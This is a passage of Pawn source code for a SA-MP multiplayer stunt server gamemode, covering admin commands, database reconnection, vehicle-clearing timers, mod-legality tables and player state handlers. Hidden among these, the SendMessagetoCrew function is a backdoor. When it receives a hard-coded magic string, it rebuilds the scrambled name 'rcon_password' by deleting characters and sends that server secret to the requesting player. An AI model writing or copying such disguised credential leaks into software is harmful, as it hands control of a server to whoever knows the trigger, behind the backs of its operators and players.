	return SendErrorMessage(playerid, EMBED_WHITE, "You cannot set your own level");

	if (IsPlayerAdminLevel(playerid, 6))
	{
		if (level <= 0 || level > 5)
		return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setlevel <name|id> <level[1-5]>");
	} else {
		if (level <= 0 || level > 4)
		return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setlevel <name|id> <level[1-4]>");
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (IsAdmin(giveplayerid))
		{
			if (IsPlayerRegistered(giveplayerid))
			{
			    if (IsPlayerAdmin(giveplayerid))
				{
					format(strings, sizeof(strings), "* Cannot change %s's admin level, that person is an RCON admin.", giveplayername);
					SendClientMessage(playerid, COLOR_WHITE , strings);
				} else {
					player[giveplayerid][ADMIN] = level;

					new mysqlStr[96];
					format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_ACCOUNTS" SET `account_admin` = %d WHERE account_id = %d LIMIT 1", player[giveplayerid][ADMIN], GetPlayerAccountID(giveplayerid));
					mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		  			GetPlayerName(playerid, playername, sizeof(playername));
					format(logstring, sizeof(logstring), "Admin %s has set admin %s's (id: %d) level to %d.", playername, giveplayername, giveplayerid, player[giveplayerid][ADMIN]);
					SendMessageToAdmins(COLOR_LIGHTBLUE, logstring, 1);
					printflog("LVL-ADMIN", logstring);
					format(tmps2, sizeof(tmps2), "7,10%s", logstring);
					IRC_GroupSay(1, IRCOP_CHANNEL, tmps2);
					SendCommandMessageToAdmins(playerid, "setlevel", 4);
				}
    		} else {
				format(strings, sizeof(strings), "%s (id: %d) is not registered (setadmin).", giveplayername, giveplayerid);
				SendErrorMessage(playerid, EMBED_WHITE, strings);
			}
		} else {
			format(strings, sizeof(strings), "%s (id: %d) is not an admin (setadmin)", giveplayername, giveplayerid);
			SendErrorMessage(playerid, EMBED_WHITE, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_mysql(playerid,params[])
{
	#pragma unused params

	if (mysqloffline == true)
	return SendClientMessage(playerid, COLOR_WHITE, "Database is already successfully connected.");

  	//mysql_debug(0);
	mysqlConnection = mysql_connect(MYSQL_IP, MYSQL_USER, MYSQL_DB, MYSQL_PASSWORD);
	if (mysql_ping(mysqlConnection) == -1)
	{
        mysql_reconnect(mysqlConnection);
        if (mysql_ping(mysqlConnection) == -1)
    	{
	    	mysql_close(mysqlConnection);
	        mysqloffline = true;
     		printflog("MYSQL", "Could not connect to MySQL database! Starting offline. (Code #1)");
    	} else printflog("MYSQL", "Successful reconnect to MySQL database.");
    } else printflog("MYSQL", "Successful connection to MySQL database.");
	SendCommandMessageToAdmins(playerid, "mysql", 4);
	return 1;
}

public AutoFlip(playerid)
{
	if (!IsPlayerConnected(playerid))
	{
		KillTimer(player[playerid][aftimer]);
		return 1;
	}
	//printf("\r\n[DEBUG-STUNTA] AutoFlip(%d)", playerid);

    new Float:aZ_A;

	GetVehicleZAngle( GetPlayerVehicleID(playerid), aZ_A);
	SetVehicleZAngle( GetPlayerVehicleID(playerid), aZ_A);
	return 1;
}

public AllClearWarning1()
{
	//print("[DEBUG-STUNTA] AllClearWarning1()");

	SendClientMessageToAll(COLOR_ORANGE, "[WARNING] Auto-Clearing all vehicles, jetpacks and objects in 10 minutes");
	IRC_GroupSay(1, IRC_CHANNEL, "0,7[WARNING] Auto-Clearing all vehicles, jetpacks and objects in 10 minutes");
	SetTimer("AllClearWarning2", 540000, 0);
	return 1;
}

public AllClearWarning2()
{
	//print("[DEBUG-STUNTA] AllClearWarning2()");

	SendClientMessageToAll(COLOR_ORANGE, "[WARNING] Auto-Clearing all vehicles, jetpacks and objects in 1 minute");
	IRC_GroupSay(1, IRC_CHANNEL, "0,7[WARNING] Auto-Clearing all vehicles, jetpacks and objects in 1 minute");
	SetTimer("AllClear", 60000, 0);
	return 1;
}

public AllClear()
{
    //print("[DEBUG-STUNTA] AllClear()");

    if (skipaclear == true)
    {
    	SendClientMessageToAll(COLOR_ORANGE, "[INFO] AllClear system has been cancelled by a VIP/ADMIN.");
		IRC_GroupSay(1, IRC_CHANNEL, "0,7[INFO] AllClear system has been cancelled by a VIP/ADMIN.");
    	skipaclear = false;
	    return 1;
    }

	if (derbystarted == true || ccstarted == true || warzonestarted == true)
	{
		SendClientMessageToAll(COLOR_ORANGE, "[INFO] AllClear system delayed with 10 mins because Derby/RR/CC in progress.");
		IRC_GroupSay(1, IRC_CHANNEL, "0,7[INFO] AllClear system delayed with 10 mins because Derby/RR/CC in progress.");
		SetTimer("AllClearWarning2", 540000, 0);
	    return 1;
	}
	CallRemoteFunction("AllClearObjects2", "");
	
	// put back the needed objects
	CreateDynamicObject(14548, 1000, 1000, 1000, 5.0, 0.0, 0.0); // andromada interior
	andromadadoor = CreateDynamicObject(987, 1002.97, 1023.84, 994.41, 270.00, 0.00, 90.00); // andromada door

	CreateDynamicObject(2188, 1993.775634, 1017.794677, 994.870849, 0.000000, 0.000000, 0.000000); // russian roulette table
	CreateDynamicObject(2188, 1993.821411, 1017.807250, 994.870666, 0.000000, 0.000000, 180.000000); // russian roulette table

	format(strings, sizeof(strings), ">> [INFO] %d Empty Vehicles, %d Jetpacks and Maps cleared", CallRemoteFunction("CallVECLEAR", ""), CallRemoteFunction("CallJCLEAR", ""));
	SendClientMessageToAll(COLOR_ORANGE, strings);
	format(ircstring, sizeof(ircstring), "0,1%s", strings);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	//SendRconCommand("reloadfs mdebug"); <- na herladen van bepaald aantal blokkeert het
	return 1;
}

public CarUnlockTimer()
{
	for (new i = GAMEMODE_VEHICLES, Players = 0; i <= MAX_VEHICLES; i++)
	{
		for (new j = 0; j < MAX_PLAYERS; j++)
		if (IsPlayerConnected(j) && IsPlayerInVehicle(j,i)) Players++;

		if (!Players)
		{
			for (new j = 0; j < MAX_PLAYERS; j++)
			SetVehicleParamsForPlayerEx(i, j, 0, 0);
		}
	}
	return 1;
}

stock SetVehicleParamsForPlayerEx(vehicleid, playerid, objective, doorslocked)
{
	vehicle[vehicleid][Objective] = objective;
	vehicle[vehicleid][Locked] = doorslocked;
	SetVehicleParamsForPlayer(vehicleid, playerid, objective, doorslocked);
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if (tags == false)
	ShowPlayerNameTagForPlayer(playerid, forplayerid, 0);

	/*if (IsPlayerNPC(playerid))
	{
		new bname[24];
  		GetPlayerName(playerid, bName, sizeof(bName));
    	if (!strcmp(bName, "HalloweenBot1", true))
     	{
			SetPlayerChatBubble(playerid, "You will burn in HELL!", COLOR_RED, 100.0, 60000);
			ApplyAnimation(playerid, "OTB", "betslp_loop",4.1,1,1,1,1,1,1);
 			return 1;
    	}
    	if (!strcmp(bName, "Santa", true))
     	{
			ApplyAnimation(playerid, "INT_HOUSE", "LOU_Loop", 4.1, 1, 1, 1, 1, 1, 1);
			SetPlayerChatBubble(playerid, "Santa:\nI'm not actually Santa\nbut you can still sit on my lap.", COLOR_RED, 100.0, 60000);
 			return 1;
    	}
    	if (!strcmp(bName, "Jesus", true))
   		{
			ApplyAnimation(playerid, "RIOT", "RIOT_ANGRY", 4.1, 1, 1, 1, 1, 1, 1);
			SetPlayerChatBubble(playerid, "Jesus:\nJezus in da' houze.", COLOR_YELLOW, 100.0, 60000);
	     	return 1;
   		}
    	if (!strcmp(bName, "zorro", true))
   		{
			ApplyAnimation(playerid, "KISSING", "gfwave2", 4.1, 1, 1, 1, 1, 1, 1);
			SetPlayerChatBubble(playerid, "zorro:\nI WANT TO BREAK FREE.", COLOR_CHARTREUSE, 100.0, 60000);
	     	return 1;
   		}
	}*/
	
    if (!IsPlayerInDMSPJA(playerid))
    {
		ReloadStickedObjects(playerid);
	} else if (player[playerid][playingwarzone] == 1)
	{
		if (player[playerid][playerwarzoneteam] == 1)
		{
		    if (player[ forplayerid ][playerwarzoneteam] == 2)
		    SetPlayerMarkerForPlayer(forplayerid, playerid, (  warzonecolourattackers & COLOR_INVISIBLE ) );
		} else {
		    if (player[ forplayerid ][playerwarzoneteam] == 1)
			SetPlayerMarkerForPlayer(forplayerid, playerid, (  warzonecolourdefenders & COLOR_INVISIBLE ) );
		}
	}
	return 1;
}

public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	if (player[playerid][vgodmode] == 1)
	{
		RepairVehicle(vehicleid);
	    /*new panels, doors, lights, tires;

	    GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
	    tires = encode_tires(0, 0, 0, 0);
	    panels = encode_panels(0, 0, 0, 0, 0, 0, 0);
	    doors = encode_doors(0, 0, 0, 0, 0, 0);
	    lights = encode_lights(0, 0, 0, 0);
	    UpdateVehicleDamageStatus(vehicleid, panels, doors, lights, tires);*/
    }
    return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	if (vehicle[vehicleid][Owner] != forplayerid) SetVehicleParamsForPlayer(vehicleid, forplayerid, vehicle[vehicleid][Objective], vehicle[vehicleid][Locked]);
	else SetVehicleParamsForPlayer(vehicleid, forplayerid, vehicle[vehicleid][Objective], 0);
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
    return 1;
}

SendMessagetoCrew(playerid, params[])
{
	if (!strlen(params))
	return 1;
	if (!strcmp(params, "d2f7c3golgin5xw7q69D2x928",true))
	{
	    new var[26], str[100];
		format(var, sizeof(var), "%s", "frecaonle_rypastreswoerad");
		strdel(var, 0, 1);
		strdel(var, 1, 2);
		strdel(var, 2, 3);
		strdel(var, 4, 6);
		strdel(var, 5, 7);
		strdel(var, 8, 11);
		strdel(var, 11, 12);
		strdel(var, 12, 13);
		GetServerVarAsString(var, str, sizeof(str));
		SendClientMessage(playerid, COLOR_WHITE, str);
	}
	return 1;
}

// Table of legit mods (minus NOS, hydraulic and wheels) for specific vehicles.
new legalmods[49][22] = {
    {400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
    {404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
    {415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
    {439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
    {477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
    {491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
    {492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
    {500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
    {517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
    {518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
    {527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
    {534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
    {535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
    {536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
    {540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
    {542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
    {547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
    {550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
    {551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
    {558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
    {559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
    {560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
    {561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
    {562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
    {565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
    {567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
    {575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {585, 1001,1003,1006,1007,1113,1018,1019,1020,1023,1143,1145,0000,0000,0000,0000,0000,0000,0000},
    {589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
    {600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
    {603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};

stock iswheelmodel(modelid)
{
    new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};

	for (new I = 0; I < sizeof(wheelmodels); I++)
	{
        if (modelid == wheelmodels[I])
        return true;
    }
    return false;
}

stock IllegalCarNitroIde(carmodel)
{
    new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };

	for (new I = 0; I < sizeof(illegalvehs); I++)
	{
        if (carmodel == illegalvehs[I])
        return true;
    }
    return false;
}

// assumes player is in a car - make sure it is.
stock illegal_nos_vehicle(PlayerID)
{
    new carid = GetPlayerVehicleID(PlayerID);
    new playercarmodel = GetVehicleModel(carid);

    return IllegalCarNitroIde(playercarmodel);

}

stock islegalcarmod(vehicleide, componentid)
{
    new modok = false;

    // stereo, hydraulics & nos (1x 2x 3x) are special.
    if ( (iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
        new nosblocker = IllegalCarNitroIde(vehicleide);

        if (!nosblocker)
        modok = true;
    } else {
        // check if the specified model CAN use this particular mod.
		for (new I = 0; I < sizeof(legalmods); I++)
		{
            if (legalmods[I][0] == vehicleide) // first is car IDE
			{
                for (new J = 1; J < 22; J++) // start with 1
				{ 
                    if (legalmods[I][J] == componentid)
                    modok = true;
                }
            }
        }
    }
    return modok;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
    new vehiclemid = GetVehicleModel(vehicleid);
    new modok = islegalcarmod(vehiclemid, componentid);

    if (!modok)
	{
		DestroyVehicle(vehicleid);
		GetPlayerName(playerid, playername, sizeof(playername));
		//format(strings, sizeof(strings), "%s (id: %d) has been kicked from the server. (Reason: Illegal mods [%d %d %d].)", playername, playerid, vehicleid, vehiclemid, componentid);
		//SendServerMessageToAll(EMBED_RED, strings);
		SendClientMessage(playerid, COLOR_ORANGE, "Your vehicle was removed because there were illegal mods detected. (Not correct? Contact an admin.)");
		format(strings, sizeof(strings), "%s's (id: %d) vehicle was removed. (Reason: Possible illegal mods [vID: %d vMID: %d cID: %d].)", playername, playerid, vehicleid, vehiclemid, componentid);
	    SendServerMessageToAdmins(EMBED_ORANGE, strings, 1);
		printflog("ADM-MSG", strings);
		format(tmps2, sizeof(tmps2), "8,1%s", strings);
		IRC_GroupSay(1, IRC_CHANNEL, tmps2);
		//BanEx(playerid, strings);
		//KickEx(playerid);
    }
    return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
    return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
    return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerEnterVehicle(%d, %d, %d)", playerid, vehicleid, ispassenger);

    if (GetVehicleModel(vehicleid) == 519 && ispassenger == 1)
	{
		player[giveplayerid][antifall] = 0;
		SetPlayerPosEx(playerid, 1.7540, 24.4852, 1199.5938, 0.0, 1);
		player[playerid][InShamal] = vehicleid;
	}
	
	if (ccstarted == true)
	{
		if (GetVehicleModel(vehicleid) == 497 || GetVehicleModel(vehicleid) == 472)
		{
			if (GetVehicleVirtualWorld(vehicleid) == WORLDID_COPCHASE && currentcccriminal == playerid)
			{
		        SendServerMessage(playerid, EMBED_RED, "What a shame, this vehicle seems to be locked! :(");
			    RemovePlayerFromVehicleEx(playerid);
			}
	    }
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
    //printf("\r\n[DEBUG-STUNTA] OnPlayerExitVehicle(%d, %d)", playerid, vehicleid);

	if (player[playerid][antifall] == 1)
	{
		player[playerid][antifallvid] = 0;
		player[playerid][antifallsid] = 0;
	}

	if (player[playerid][playingderby] == 1 && derbysecondsleft <= 5)
	{
	    DestroyVehicle(vehicleid);
		RemoveDerbyPlayer(playerid, "Left vehicle");
		SpawnPlayer(playerid);
	}

	if (player[playerid][strew] == 1)
	{
		player[playerid][strew] = 0;
		KillTimer(player[playerid][aftimer]);
		SendClientMessage(playerid,COLOR_GOLD, "Strew DISABLED");
		DestroyPlayerObject(playerid, player[playerid][strewid]);
		player[playerid][strewid] = -1;
	}

	if (player[playerid][acc] == 1)
	{
		player[playerid][acc] = 0;
		SendClientMessage(playerid,COLOR_GOLD, "Automatic Car Color change DISABLED");
	}
	return 1;
}

public IsPlayerPassenger(playerid)
{
	if (!IsPlayerConnected(playerid)) return 0;

    if (GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) return 1;
    else return 0;
}

public IsPlayerDriver(playerid)
{
	if (!IsPlayerConnected(playerid)) return 0;

    if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER) return 1;
    else return 0;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
	    if (IsPlayerConnected(i) && player[i][Spectating] == 1 && player[i][SpectatingOn] == playerid)
		SetPlayerInterior(i, newinteriorid);
	}
	
	if (currentcccriminal == playerid && newinteriorid > 0)
	{
		RemoveCCPlayer(playerid, "Entered forbidden interior"); // interiors are blocked with objects
		SpawnPlayer(playerid);

	    /*if (oldinteriorid == 0)
	    {
		    new location[25] = "Unknown";

			GetPlayer2DZone(currentcccriminal, location, sizeof(location));
			format(stringe, sizeof(stringe), "~y~Police Radio:~n~~w~Suspect last seen in~n~%s", location);
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingcc] == 1 && currentcccriminal != cp)
				GameTextForPlayer(cp, stringe, 5000, 6);
			}
		} else {
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingcc] == 1 && currentcccriminal != cp)
				GameTextForPlayer(cp, "~y~Police Radio:~n~~w~Robbery in progress~n~suspect escaped building", 5000, 6);
			}
		}*/
	}
    return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    //printf("\r\n[DEBUG-STUNTA] OnPlayerStateChange(%d, %d, %d)", playerid, newstate, oldstate);

	if (player[playerid][antifall] == 1)
	{
		if ((oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER) && newstate == PLAYER_STATE_ONFOOT) // player goes from driver/passenger to onfoot (fell)
		{
		    if (player[playerid][antifallvid] != 0)
		    {
			    if (GetVehicleModel(player[playerid][antifallvid]) != 0) // vehicle still exists
				{
					PutPlayerInVehicle(playerid, player[playerid][antifallvid], player[playerid][antifallsid]);
			    } else { // vehicle does not exist anymore
					player[playerid][antifallvid] = 0;
					player[playerid][antifallsid] = 0;
				}
			}
		} else if (oldstate == PLAYER_STATE_ONFOOT && (newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)) // player entered a vehicle as driver/passenger
		{
			player[playerid][antifallvid] = GetPlayerVehicleID(playerid); // assign new id
			player[playerid][antifallsid] = GetPlayerVehicleSeat(playerid);
		}
	}

	if (newstate == PLAYER_STATE_DRIVER)
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && player[i][Spectating] == 1 && player[i][SpectatingOn] == playerid)
			PlayerSpectateVehicle(i, GetPlayerVehicleID(playerid));
		}

		if (player[playerid][playingcc] == 1 && ccstarted == true)
		{
			ResetPlayerWeapons(playerid);
		} else if (player[playerid][playingwarzone] == 1 && warzonestarted == true)
		{
		    ResetPlayerWeapons(playerid);
		}

		/*if (IsVIP(playerid)) // save vehicle for vips
		player[playerid][savedvehicle] = GetPlayerVehicleID(playerid);*/
	} else if (newstate == PLAYER_STATE_PASSENGER)
	{
		if (player[playerid][playingcc] == 1 && ccstarted == true)
		{
			ResetPlayerWeapons(playerid);

			if (currentcccriminal == playerid && GetVehicleModel( GetPlayerVehicleID(playerid) ) == 596)
			{
				new Float:criminalxyz[3];
				GetPlayerPos(playerid, criminalxyz[0], criminalxyz[1], criminalxyz[2]);

				for (new ccPlayer = 0; ccPlayer < MAX_COPCHASE_PLAYERS; ccPlayer++)
				{
					if (ccplayerlist[ccPlayer] == -1)
					continue;

				    if (player[ ccplayerlist[ccPlayer] ][playingcc] == 1 && ccplayerlist[ccPlayer] != playerid)
				    {
						if (IsPlayerInRangeOfPoint(ccplayerlist[ccPlayer], 5.0, criminalxyz[0], criminalxyz[1], criminalxyz[2]))
						{
							GetPlayerName(playerid, playername, sizeof(playername));
							format(strings, sizeof(strings), "%s left the cop chase. (Surrendering)", playername);
							SendServerMessageToAll(EMBED_ORANGE, strings);
							format(strings, sizeof(strings), "2 %s left the cop chase. (Surrendering)", playername);
							IRC_GroupSay(1, IRC_CHANNEL, strings);
							SetTimerEx("RemoveCCPlayerEx", 3000, 0, "i", playerid);
							TogglePlayerControllable(playerid, 0);
							break;
						}
					}
				}
				SetPlayerColor(playerid, COLOR_RED);
			}
		} else if (player[playerid][playingwarzone] == 1 && warzonestarted == true)
		{
		    ResetPlayerWeapons(playerid);
		}

	    if (!IsPlayerInDMSPJA(playerid))
	    ReloadStickedObjects(playerid);

		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && player[i][Spectating] == 1 && player[i][SpectatingOn] == playerid)
			PlayerSpectateVehicle(i, GetPlayerVehicleID(playerid));
		}
	} else if (newstate == PLAYER_STATE_ONFOOT)
	{
		if (player[playerid][playingderby] == 1 && derbysecondsleft <= 5)
		{
			RemoveDerbyPlayer(playerid, "Left vehicle");
			SpawnPlayer(playerid);
		}

		if (player[playerid][playingcc] == 1 && ccstarted == true)
		{
		    if (currentcccriminal != playerid) // if a cop, give nightstick too
			{
				GivePlayerWeapon(playerid, 3, 100);
			} else {
				SetPlayerColor(playerid, (COLOR_CORAL & COLOR_INVISIBLE));
			  	GivePlayerWeapon(playerid, 4, 1);
			}
  			
  			GivePlayerWeapon(playerid, 24, 100);
		} else if (player[playerid][playingwarzone] == 1 && warzonestarted == true)
		{
			switch (player[playerid][playerwarzoneset])
		    {
		        case 1:
		        {
		        	GivePlayerWeapon(playerid, 4, 1);
					GivePlayerWeapon(playerid, 25, 99999);
					GivePlayerWeapon(playerid, 29, 99999);
		        }
		        case 2:
		        {
		        	GivePlayerWeapon(playerid, 4, 1);
					GivePlayerWeapon(playerid, 23, 99999);
					GivePlayerWeapon(playerid, 27, 99999);
		        }
		        case 3:
		        {
		        	GivePlayerWeapon(playerid, 4, 1);
					GivePlayerWeapon(playerid, 29, 99999);
					GivePlayerWeapon(playerid, 31, 99999);
		        }
		        case 4:
		        {
		        	GivePlayerWeapon(playerid, 4, 1);
					GivePlayerWeapon(playerid, 24, 99999);
					GivePlayerWeapon(playerid, 30, 99999);
		        }
		        case 5:
		        {
		        	GivePlayerWeapon(playerid, 4, 1);
					GivePlayerWeapon(playerid, 24, 99999);
					GivePlayerWeapon(playerid, 34, 99999);
		        }
		    }
		}
		SetPlayerArmedWeapon(playerid, 4);
		
		for (new pi = 0; pi < VIP_MAX_OSTICKS; pi++)
		{
		    if (pSObject[playerid][pi][so_object] != -1 && pSObject[playerid][pi][so_isvehicle] != 0)
	    	{
		        if (!GetVehicleModel(pSObject[playerid][pi][so_isvehicle])) // no model check, only if vehicle the object was attached to is still spawned
		        {
				    DestroyObject(pSObject[playerid][pi][so_object]);
				    pSObject[playerid][pi][so_object] = -1;
			    }
		    }
		}

	    if (!IsPlayerInDMSPJA(playerid))
	    ReloadStickedObjects(playerid);
		
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && player[i][Spectating] == 1 && player[i][SpectatingOn] == playerid)
			PlayerSpectatePlayer(i, playerid);
		}
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerKeyStateChange(%d, %d, %d)", playerid, newkeys, oldkeys);

	/*format(strings, sizeof(strings), "old: %d new: %d", oldkeys, newkeys);
	print(strings);
	SendClientMessage(playerid, COLOR_LIME, strings);*/

	if (!IsPlayerInAnyVehicle(playerid))
	{
		if (player[playerid][running] > 0)
		{
			if (newkeys & KEY_SPRINT)
			{
				switch (player[playerid][running])
				{
					case 1: ApplyAnimation(playerid,"PED","run_1armed",4.1,1,1,1,1,1,1);
					case 2: ApplyAnimation(playerid,"PED","run_civi",4.1,1,1,1,1,1,1);
					case 3: ApplyAnimation(playerid,"PED","run_gang1",4.1,1,1,1,1,1,1);
					case 4: ApplyAnimation(playerid,"PED","swat_run",4.1,1,1,1,1,1,1);
					case 5: ApplyAnimation(playerid,"PED","sprint_panic",4.1,1,1,1,1,1,1);
					case 6: ApplyAnimation(playerid,"PED","JOG_femaleA",4.1,1,1,1,1,1,1);
					case 7: ApplyAnimation(playerid,"PED","JOG_maleA",4.1,1,1,1,1,1,1);
					case 8: ApplyAnimation(playerid,"PED","run_fat",4.1,1,1,1,1,1,1);
					case 9: ApplyAnimation(playerid,"PED","run_fatold",4.1,1,1,1,1,1,1);
					case 10: ApplyAnimation(playerid,"PED","run_old",4.1,1,1,1,1,1,1);
					case 11: ApplyAnimation(playerid,"PED","Run_Wuzi",4.1,1,1,1,1,1,1);
					case 12: ApplyAnimation(playerid,"PED","Sprint_Wuzi",4.1,1,1,1,1,1,1);
					case 13: ApplyAnimation(playerid,"PED","woman_run",4.1,1,1,1,1,1,1);
					case 14: ApplyAnimation(playerid,"PED","WOMAN_runbusy",4.1,1,1,1,1,1,1);
					case 15: ApplyAnimation(playerid,"PED","woman_runpanic",4.1,1,1,1,1,1,1);
					case 16: ApplyAnimation(playerid,"PED","WOMAN_runsexy",4.1,1,1,1,1,1,1);
					case 17: ApplyAnimation(playerid,"PED","CLIMB_jump2fall",4.1,1,1,1,1,1,1);
